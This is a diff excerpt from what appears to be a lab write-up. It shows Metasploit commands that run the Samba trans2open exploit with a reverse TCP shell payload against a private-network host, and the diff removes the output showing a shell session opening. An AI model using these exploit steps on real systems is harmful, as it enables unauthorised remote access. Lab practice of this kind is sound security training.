@@ -96,11 +96,6 @@ msf6 > use exploit/linux/samba/trans2open
 msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.122.88
 msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
 msf6 exploit(linux/samba/trans2open) > exploit
-
-[*] Started reverse TCP handler on 192.168.1.X:4444
-[*] 192.168.122.88:139 - Trying return address 0xbffffdfc...
-[+] 192.168.122.88:139 - Command shell session 1 opened
-
 ```
 
 ![Metasploit Console](images/metasploit_exploit.png)
